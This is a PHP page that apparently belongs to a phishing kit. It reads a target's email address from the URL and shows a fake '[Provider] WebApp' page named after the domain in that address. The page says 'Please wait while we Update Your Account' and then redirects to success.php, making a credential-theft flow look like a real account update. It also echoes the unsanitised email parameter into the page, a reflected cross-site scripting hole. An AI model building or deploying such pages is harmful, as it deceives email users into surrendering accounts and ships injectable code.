<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<title><?php echo $yuh ?> WebApp | User: <?php echo $_GET['email']; ?></title>
<meta http-equiv="refresh" content="7; url=./success.php?email=<?php echo $_GET['email']; ?>" />
</head>
<body>

<br><br><br><br>

	<table align="center" style="width:420px; height:350px; -webkit-box-shadow: 1px 1px 15px 1px #000000; 
box-shadow: 1px 1px 15px 1px #A2A2A2" bgcolor="#FAFAFA"><tr>

<td>

			<table align="center" style="width:320px;" bgcolor="#FAFAFA">
			<tr><td style="height:15px;"></td></tr>
			<tr><td>
			
				<div align="center">
				<img src="./loader.gif" style="width:200px; height:200px;">
				<br><br>
				<font face="arial" size="2">
					<font size="4"><?php echo $_GET['email']; ?></font>
					<br>
					Please wait while we Update Your Account
				</font>
				</div>
			</td></tr>
			<tr><td style="height:20px;"></td></tr>
			</table>
			
</td>



</tr></table>

</body>
</html>